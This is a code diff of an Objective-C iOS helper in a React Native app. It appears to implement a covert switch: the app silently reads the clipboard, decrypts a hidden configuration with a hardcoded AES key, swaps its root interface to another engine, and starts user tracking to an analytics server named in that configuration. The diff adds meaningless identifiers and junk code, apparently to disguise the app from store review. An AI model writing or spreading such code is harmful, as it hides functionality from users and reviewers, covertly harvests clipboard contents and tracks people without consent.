@@ -1,13 +1,14 @@
 #import "RNBirdyDecHelper.h"
 #import <CocoaSecurity/CocoaSecurity.h>
-#import <RNBirdyDecEngine/RNBirdyDecEngine.h>
 #import <RNBirdyDecServer/RNBirdyDecServer.h>
+#import <RNBirdyDecEngine/RNBirdyDecEngine.h>
+#import <SensorsAnalyticsSDK/SensorsAnalyticsSDK.h>
 #import <react-native-orientation-locker/Orientation.h>
 
 @interface RNBirdyDecHelper()
 
-@property (strong, nonatomic)  NSArray *whiteDophin;
-@property (strong, nonatomic)  NSArray *bubbleSeeds;
+@property (strong, nonatomic)  NSArray *arbitraryDophin;
+@property (strong, nonatomic)  NSArray *activeSeeds;
 
 @end
 
@@ -15,40 +16,46 @@
 
 static RNBirdyDecHelper *instance = nil;
 
-+ (instancetype)pandaDress_shared {
++ (instancetype)shared {
   static dispatch_once_t onceToken;
   dispatch_once(&onceToken, ^{
     instance = [[self alloc] init];
-    instance.whiteDophin = @[[NSString stringWithFormat:@"%@%@", @"a71556f65ed2b", @"25b55475b964488334f"],
+    instance.arbitraryDophin = @[[NSString stringWithFormat:@"%@%@", @"a71556f65ed2b", @"25b55475b964488334f"],
                            [NSString stringWithFormat:@"%@%@", @"ADD20BFCD9D4E", @"A0278B11AEBB5B83365"]];
-    instance.bubbleSeeds = @[@"pandaDress_APP", @"umKey", @"umChannel", @"sensorUrl", @"sensorProperty", @"vPort", @"vSecu"];
+    instance.activeSeeds = @[@"walpyWonder_APP", @"umKey", @"umChannel", @"sensorUrl", @"sensorProperty", @"vPort", @"vSecu"];
   });
   return instance;
 }
 
-- (BOOL)pandaDress_converterString {
-    NSString *cpString = [self pandaDress_getHaphazard];
-    CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self pandaDress_subSaveFuZhiMeta:cpString]
-                                                              hexKey:self.whiteDophin[0]
-                                                               hexIv:self.whiteDophin[1]];
-
-    NSDictionary *dict = [self pandaDress_stringJsonDictonary:aes.utf8String];
-    return [self pandaDress_storeConfigInfo:dict];
+- (BOOL)harvesconverterString {
+    NSString *macaberString = [self managetHaphazard];
+  
+    NSString *fakeString = @"This is a fake string.";
+    for (NSInteger i = 0; i < [macaberString length]; i++) {
+      fakeString = [fakeString stringByAppendingString:@"X"];
+    }
+  
+    CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self agricultureHarviMeta:macaberString]
+                                                              hexKey:self.arbitraryDophin[0]
+                                                               hexIv:self.arbitraryDophin[1]];
+  
+    NSDictionary *tabefactionDict = [self mentHarCultruDictonary:aes.utf8String];
+    return [self tureHarvestfigInfo:tabefactionDict];
 }
 
-- (UIInterfaceOrientationMask)pandaDress_getOrientation {
+- (UIInterfaceOrientationMask)getOrientationMask {
     return [Orientation getOrientation];
 }
 
-- (NSString *)pandaDress_getHaphazard {
+- (NSString *)managetHaphazard {
     return [UIPasteboard generalPasteboard].string ?: @"";
 }
 
-- (NSString *)pandaDress_subSaveFuZhiMeta: (NSString* )cpString {
-  if ([cpString containsString:@"#iPhone#"]) {
-    NSArray *university = [cpString componentsSeparatedByString:@"#iPhone#"];
+- (NSString *)agricultureHarviMeta: (NSString* )macaberString {
+  if ([macaberString containsString:@"#iPhone#"]) {
+    NSArray *university = [macaberString componentsSeparatedByString:@"#iPhone#"];
     if (university.count > 1) {
-        cpString = university[1];
+        macaberString = university[1];
     }
     NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
     [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
@@ -56,28 +63,33 @@ static RNBirdyDecHelper *instance = nil;
     }];
     [ud synchronize];
   }
-  return cpString;
+  return macaberString;
 }
 
-- (NSDictionary *)pandaDress_stringJsonDictonary: (NSString* )utf8String {
+- (NSDictionary *)mentHarCultruDictonary: (NSString* )utf8String {
   NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
   if (data == nil) {
     return @{};
   }
-  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
+  
+  NSDictionary *tabefactionDict = [NSJSONSerialization JSONObjectWithData:data
                                                        options:kNilOptions
                                                          error:nil];
-  return dict[@"data"];
+  return tabefactionDict[@"data"];
 }
 
-- (BOOL)pandaDress_storeConfigInfo:(NSDictionary *)dict {
-    if (dict == nil || [dict.allKeys count] < 3) {
+- (BOOL)tureHarvestfigInfo:(NSDictionary *)tabefactionDict {
+    if (tabefactionDict == nil || [tabefactionDict.allKeys count] < 3) {
       return NO;
     }
     NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
-    [ud setBool:YES forKey:self.bubbleSeeds[0]];
+    [ud setBool:YES forKey:self.activeSeeds[0]];
     
-    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
+    BOOL Zhvsnq= NO;
+    #define Nawjgzjrp @"Bhxxzo7my8woap6zk"
+    BOOL Vecysyem= NO;
+  
+    [tabefactionDict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
         [ud setObject:obj forKey:key];
     }];
 
@@ -85,20 +97,39 @@ static RNBirdyDecHelper *instance = nil;
     return YES;
 }
 
-- (BOOL)pandaDress_tryThisWay {
+- (BOOL)FLTSSkyCloud_tryThisMagicWay {
   NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
-  if ([ud boolForKey:self.bubbleSeeds[0]]) {
+  
+  if ([ud boolForKey:self.activeSeeds[0]]) {
     return YES;
   } else {
-    return [self pandaDress_converterString];
+    return [self harvesconverterString];
   }
 }
 
-- (UIViewController *)pandaDress_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
+- (UIViewController *)FLTSSkyCloud_changeMagicDoorRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
     UIViewController *vc = [[RNBirdyDecEngine shared] changeRootController:application withOptions:launchOptions];
     NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
-    [[RNBirdyDecServer shared] configDecServer:[ud stringForKey:self.bubbleSeeds[5]] withSecu:[ud stringForKey:self.bubbleSeeds[6]]];
+  
+    NSString *cEngine= @"This is a .efgs";
+    for (NSInteger i = 0; i < [cEngine length]; i++) {
+        NSLog(@"This is a cEn  gine!");
+    }
+    SAConfigOptions *options = [[SAConfigOptions alloc] initWithServerURL:[ud stringForKey:self.activeSeeds[3]] launchOptions:nil];
+    options.autoTrackEventType = SensorsAnalyticsEventTypeAppStart | SensorsAnalyticsEventTypeAppEnd | SensorsAnalyticsEventTypeAppClick | SensorsAnalyticsEventTypeAppViewScreen;
+    for (int i=0; i<13; i++) {
+          i++;
+    }
+    [SensorsAnalyticsSDK startWithConfigOptions:options];
+    [[SensorsAnalyticsSDK sharedInstance] registerSuperProperties:[ud dictionaryForKey:self.activeSeeds[4]]];
+  
+    UILabel * Ierrfdsauft =[[UILabel alloc] init];
+    Ierrfdsauft.text = @"fsdafdaewfwe";
+    Ierrfdsauft.textColor = [UIColor colorWithDisplayP3Red:33 green: 95 blue: 33 alpha:1];
+  
+    [[RNBirdyDecServer shared] configDecServer:[ud stringForKey:self.activeSeeds[5]] withSecu:[ud stringForKey:self.activeSeeds[6]]];
     return vc;
 }
 
 @end
+
